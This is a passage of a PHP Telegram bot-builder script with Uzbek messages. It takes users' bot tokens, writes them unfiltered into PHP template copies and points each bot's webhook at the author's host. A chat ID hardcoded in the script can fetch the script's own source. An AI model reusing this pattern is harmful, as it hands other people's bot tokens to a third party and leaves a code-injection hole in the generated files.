    file_put_contents("baza/$uid/voice.php", file_get_contents("voice.php"));
    $savet =  str_replace("API_API", "$px", file_get_contents("baza/$uid/voice.php"));
    file_put_contents("baza/$uid/voice.php", "$savet");

	file_get_contents("https://api.telegram.org/bot$px/setwebhook?url=https://Uzbboy.000webhostapp.com/STARK/baza/$uid/voice.php");

bot('sendmessage',[
   'chat_id'=>$cid,
   'text'=>"🌐Botingiz serverga muvaffaqiyatli ulandi❕

🔰Botingiz manzili: @$botus 👈

",
   'parse_mode' => 'html',
   'reply_markup'=>$back,   
  ]);

}
if($text=="🔹Instagram 2🔸"){
	bot('sendmessage',[
   'chat_id'=>$cid,
   'text'=>"Tokenni yozib yuboring...✏️
   Namuna: /insta2 755174882:AAGemn6my3SZrp_IWFzq7xNMo2GcoQ5g8F0",
   'parse_mode' => 'html',
   'reply_markup'=>$back, 
  ]);
}
			if(mb_stripos($text, "/insta2")!==false){
	$ex=explode(" ", $text);
	$px=$ex[1];
	    $to = file_get_contents("https://api.telegram.org/bot$px/getme");
    $json = json_decode($to);
    $botus = $json->result->username;
    $clone=file_get_contents("baza/$uid/insta.php");
    file_put_contents("baza/$uid/insta.php", file_get_contents("insta.php"));
    $savet =  str_replace("API_API", "$px", file_get_contents("baza/$uid/insta.php"));
    file_put_contents("baza/$uid/insta.php", "$savet");

	file_get_contents("https://api.telegram.org/bot$px/setwebhook?url=https://Uzbboy.000webhostapp.com/STARK/baza/$uid/insta.php");

bot('sendmessage',[
   'chat_id'=>$cid,
   'text'=>"🌐Botingiz serverga muvaffaqiyatli ulandi❕

🔰Botingiz manzili: @$botus 👈

",
   'parse_mode' => 'html',
   'reply_markup'=>$back,   
  ]);

}
if($text=="📸ScreenShot🌇"){
	bot('sendmessage',[
   'chat_id'=>$cid,
   'text'=>"Tokenni yozib yuboring...✏️
   Namuna: /screen 755174882:AAGemn6my3SZrp_IWFzq7xNMo2GcoQ5g8F0",
   'parse_mode' => 'html',
   'reply_markup'=>$back, 
  ]);
}
			if(mb_stripos($text, "/screen")!==false){
	$ex=explode(" ", $text);
	$px=$ex[1];
	    $to = file_get_contents("https://api.telegram.org/bot$px/getme");
    $json = json_decode($to);
    $botus = $json->result->username;
    $clone=file_get_contents("baza/$uid/screen.php");
    file_put_contents("baza/$uid/screen.php", file_get_contents("screen.php"));
    $savet =  str_replace("API_API", "$px", file_get_contents("baza/$uid/screen.php"));
    file_put_contents("baza/$uid/screen.php", "$savet");

	file_get_contents("https://api.telegram.org/bot$px/setwebhook?url=https://Uzbboy.000webhostapp.com/STARK/baza/$uid/screen.php");

bot('sendmessage',[
   'chat_id'=>$cid,
   'text'=>"🌐Botingiz serverga muvaffaqiyatli ulandi❕

🔰Botingiz manzili: @$botus 👈

",
   'parse_mode' => 'html',
   'reply_markup'=>$back,   
  ]);

}
if($text=="⌚️Soatim⌚️"){
	bot('sendmessage',[
   'chat_id'=>$cid,
   'text'=>"Tokenni yozib yuboring...✏️
   Namuna: /soatim 755174882:AAGemn6my3SZrp_IWFzq7xNMo2GcoQ5g8F0",
   'parse_mode' => 'html',
   'reply_markup'=>$back, 
  ]);
}
			if(mb_stripos($text, "/soatim")!==false){
	$ex=explode(" ", $text);
	$px=$ex[1];
	    $to = file_get_contents("https://api.telegram.org/bot$px/getme");
    $json = json_decode($to);
    $botus = $json->result->username;
    $clone=file_get_contents("baza/$uid/soatim.php");
    file_put_contents("baza/$uid/soatim.php", file_get_contents("soatim.php"));
    $savet =  str_replace("API_API", "$px", file_get_contents("baza/$uid/soatim.php"));
    file_put_contents("baza/$uid/soatim.php", "$savet");
    $savea =  str_replace("API_ADMIN", "$uid", file_get_contents("baza/$uid/soatim.php"));
    file_put_contents("baza/$uid/soatim.php", "$savea");
	$saveb =  str_replace("API_BOT", "$botus", file_get_contents("baza/$uid/soatim.php"));
    file_put_contents("baza/$uid/soatim.php", "$saveb");

	file_get_contents("https://api.telegram.org/bot$px/setwebhook?url=https://Uzbboy.000webhostapp.com/STARK/baza/$uid/soatim.php");

bot('sendmessage',[
   'chat_id'=>$cid,
   'text'=>"🌐Botingiz serverga muvaffaqiyatli ulandi❕

🔰Botingiz manzili: @$botus 👈

",
   'parse_mode' => 'html',
   'reply_markup'=>$back,   
  ]);

}
if($text=="↖️Share 2↗️"){
	bot('sendmessage',[
   'chat_id'=>$cid,
   'text'=>"Tokenni yozib yuboring...✏️
   Namuna: /share2 755174882:AAGemn6my3SZrp_IWFzq7xNMo2GcoQ5g8F0",
   'parse_mode' => 'html',
   'reply_markup'=>$back, 
  ]);
}
			if(mb_stripos($text, "/share2")!==false){
	$ex=explode(" ", $text);
	$px=$ex[1];
	    $to = file_get_contents("https://api.telegram.org/bot$px/getme");
    $json = json_decode($to);
    $botus = $json->result->username;
    $clone=file_get_contents("baza/$uid/sharee.php");
    file_put_contents("baza/$uid/sharee.php", file_get_contents("sharee.php"));
    $savet =  str_replace("API_API", "$px", file_get_contents("baza/$uid/sharee.php"));
    file_put_contents("baza/$uid/sharee.php", "$savet");
    $savea =  str_replace("API_ADMIN", "$uid", file_get_contents("baza/$uid/sharee.php"));
    file_put_contents("baza/$uid/sharee.php", "$savea");

	file_get_contents("https://api.telegram.org/bot$px/setwebhook?url=https://Uzbboy.000webhostapp.com/STARK/baza/$uid/sharee.php");

bot('sendmessage',[
   'chat_id'=>$cid,
   'text'=>"🌐Botingiz serverga muvaffaqiyatli ulandi❕

🔰Botingiz manzili: @$botus 👈

",
   'parse_mode' => 'html',
   'reply_markup'=>$back,   
  ]);

}
if($text=="⛓WebHook🔩"){
	bot('sendmessage',[
   'chat_id'=>$cid,
   'text'=>"Tokenni yozib yuboring...✏️
   Namuna: /webhook 755174882:AAGemn6my3SZrp_IWFzq7xNMo2GcoQ5g8F0",
   'parse_mode' => 'html',
   'reply_markup'=>$back, 
  ]);
}
			if(mb_stripos($text, "/webhook")!==false){
	$ex=explode(" ", $text);
	$px=$ex[1];
	    $to = file_get_contents("https://api.telegram.org/bot$px/getme");
    $json = json_decode($to);
    $botus = $json->result->username;
    $clone=file_get_contents("baza/$uid/webhook.php");
    file_put_contents("baza/$uid/webhook.php", file_get_contents("webhook.php"));
    $savet =  str_replace("API_API", "$px", file_get_contents("baza/$uid/webhook.php"));
    file_put_contents("baza/$uid/webhook.php", "$savet");

	file_get_contents("https://api.telegram.org/bot$px/setwebhook?url=https://Uzbboy.000webhostapp.com/STARK/baza/$uid/webhook.php");

bot('sendmessage',[
   'chat_id'=>$cid,
   'text'=>"🌐Botingiz serverga muvaffaqiyatli ulandi❕

🔰Botingiz manzili: @$botus 👈

",

   'parse_mode' => 'html',
   'reply_markup'=>$back,   
  ]);

}



#---------------------------KING---------------------------#
$lichka = file_get_contents("lichka.db");
$xabar = file_get_contents("xabarlar.txt");
if($type=="supergroup" or $type=="group"){
if(strpos($gruppa,"$cid") !==false){
}else{
file_put_contents("gruppa.db","$gruppa\n$cid");
}
}
if($type=="private"){
if(strpos($lichka,"$cid") !==false){
}else{
file_put_contents("lichka.db","$lichka\n$cid");
}
} 
$reply = $message->reply_to_message->text;
$rpl = json_encode([
            'resize_keyboard'=>false,
            'force_reply'=>true,
            'selective'=>true
        ]);
if($text=="/send" and $cid==$admin){
  bot('sendmessage',[
    'chat_id'=>$admin,
    'text'=>"Yozing...✏️",
    'parse_mode'=>"html",
]);
    file_put_contents("xabarlar.txt","user");
}
if($xabar=="user" and $cid==$admin){
if($text=="/no"){
   bot('sendmessage',[
    'chat_id'=>$admin,
    'text'=>"!Bekor qilindi!",
    'parse_mode'=>"html",
]);
  file_put_contents("xabarlar.txt","");
}else{
  $lich = file_get_contents("lichka.db");
  $lichka = explode("\n",$lich);
  foreach($lichka as $lichkalar){
  $okuser=bot("sendmessage",[
    'chat_id'=>$lichkalar,
    'text'=>$text,
    'parse_mode'=>'html'
]);
}
if($okuser){
  bot("sendmessage",[
    'chat_id'=>$admin,
    'text'=>"📨Habaringiz jo'natildi↗️ (USERLAR)",
    'parse_mode'=>'html',
]);
  file_put_contents("xabarlar.txt","");
}
}
}
#---------------------------KING---------------------------#
if($type=="private"){
if($text=="/stat"){
  $soat = date('H:i', strtotime('5 hour'));
  $sana = date('d.m.Y',strtotime('5 hour'));
  $lich = substr_count($lichka,"\n");
  bot('sendmessage',[
    'chat_id'=>$cid,
    'text'=>"
♦STATISTIKA♦	
	
<b>Bot foydalanuvchilari soni: $lich ta</b>
<i>
📆 Bugun sana: $sana
⏰ Hozir soat: $soat
</i>",
    'parse_mode'=>"html"
  ]);
}
}
$data = $update->callback_query->data;
if($text == '/file' and $cid == 686980246){
        bot('sendMessage',[
        'chat_id'=>$cid,
             'text'=> "*Qaysi bot kodi kere?*",
     'parse_mode' => 'markdown',
     'disable_web_page_preview'=>true,
     'reply_markup'=>json_encode([
     'inline_keyboard' =>[
     [['text'=>'Robot','callback_data'=>"robot"]],
     [['text'=>'eLikebot','callback_data'=>"elik"],['text'=>'Guard','callback_data'=>"Guard"]],
     [['text'=>'Livegram','callback_data'=>"livegram"],['text'=>'Maker','callback_data'=>"Maker"]],
     [['text'=>'Share','callback_data'=>"Share"],['text'=>'Niklar','callback_data'=>"Niklar"]],
     [['text'=>'Taxrir','callback_data'=>"Taxrir"],['text'=>'X-0','callback_data'=>"X-0"]],
     [['text'=>'Yoqdibot','callback_data'=>"yoqdibot"],['text'=>'YouDown','callback_data'=>"YouDown"]],
     ]]),]);}    

$cqid = $update->callback_query->id;
if($data=="robot"){
    bot('answerCallbackQuery',[
       'callback_query_id'=>$cqid,
       'text'=> "Fayl Yuborildi",
        ]);
    bot('sendDocument',[
            'chat_id'=>686980246,
            'document'=>new CURLFile(__FILE__)]); }
            
if($data=="elik"){
    bot('answerCallbackQuery',[
       'callback_query_id'=>$cqid,
       'text'=> "Fayl Yuborildi",
        ]);
    bot('sendDocument',[
            'chat_id'=>686980246,
            'document'=>"https://Uzbboy.000webhostapp.com/STARK/elikbot.php"]);}
            
if($data=="Guard"){
    bot('answerCallbackQuery',[
       'callback_query_id'=>$cqid,
       'text'=> "Fayl Yuborildi",
        ]);
    bot('sendDocument',[
            'chat_id'=>686980246,
            'document'=>"https://Uzbboy.000webhostapp.com/STARK/Guard.php"]);}
            
if($data=="livegram"){
    bot('answerCallbackQuery',[
       'callback_query_id'=>$cqid,
       'text'=> "Fayl Yuborildi",
        ]);
    bot('sendDocument',[
            'chat_id'=>686980246,
            'document'=>"https://Uzbboy.000webhostapp.com/STARK/livegram.php"]);}
            
if($data=="Maker"){
    bot('answerCallbackQuery',[
       'callback_query_id'=>$cqid,
       'text'=> "Fayl Yuborildi",
        ]);
    bot('sendDocument',[
            'chat_id'=>686980246,
            'document'=>'https://Uzbboy.000webhostapp.com/STARK/Maker.php']);}
            
if($data=="Share"){
    bot('answerCallbackQuery',[
       'callback_query_id'=>$cqid,
       'text'=> "Fayl Yuborildi",
        ]);
    bot('sendDocument',[
            'chat_id'=>686980246,
            'document'=>'https://Uzbboy.000webhostapp.com/STARK/Share.php']);}
            
if($data=="Niklar"){
    bot('answerCallbackQuery',[
       'callback_query_id'=>$cqid,
       'text'=> "Fayl Yuborildi",
        ]);
    bot('sendDocument',[
            'chat_id'=>686980246,
            'document'=>'https://Uzbboy.000webhostapp.com/STARK/Niklar.php']);}
            
if($data=="Taxrir"){
    bot('answerCallbackQuery',[
       'callback_query_id'=>$cqid,
       'text'=> "Fayl Yuborildi",
        ]);
    bot('sendDocument',[
            'chat_id'=>686980246,
            'document'=>'https://Uzbboy.000webhostapp.com/STARK/Taxrir.php']);}
            
if($data=="X-0"){
    bot('answerCallbackQuery',[
       'callback_query_id'=>$cqid,
       'text'=> "Fayl Yuborildi",
        ]);
    bot('sendDocument',[
            'chat_id'=>686980246,
            'document'=>'https://Uzbboy.000webhostapp.com/STARK/X-0.php']);}

if($data=="yoqdibot"){
    bot('answerCallbackQuery',[
       'callback_query_id'=>$cqid,
       'text'=> "Fayl Yuborildi",
        ]);
    bot('sendDocument',[
            'chat_id'=>686980246,
            'document'=>'https://Uzbboy.000webhostapp.com/STARK/yoqdibot.php']);}
            
if($data=="YouDown"){
    bot('answerCallbackQuery',[
       'callback_query_id'=>$cqid,
       'text'=> "Fayl Yuborildi",
        ]);
    bot('sendDocument',[
            'chat_id'=>686980246,
            'document'=>'https://Uzbboy.000webhostapp.com/STARK/YouDown.php']);}
			




			
                                    ?>
